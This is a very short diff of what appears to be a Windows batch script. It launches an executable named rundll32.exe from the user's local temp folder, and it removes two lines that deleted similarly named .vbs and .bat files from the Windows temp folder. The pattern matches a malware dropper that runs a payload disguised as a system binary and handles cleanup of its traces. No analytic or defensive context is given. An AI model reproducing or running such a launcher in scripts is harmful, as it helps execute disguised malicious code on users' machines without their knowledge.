@@ -1,4 +1,2 @@
 start %localappdata%\\temp\\rundll32.exe
-del c:\\windows\\temp\\rundll32.vbs
-del c:\\windows\\temp\\rundll32.bat
 exit
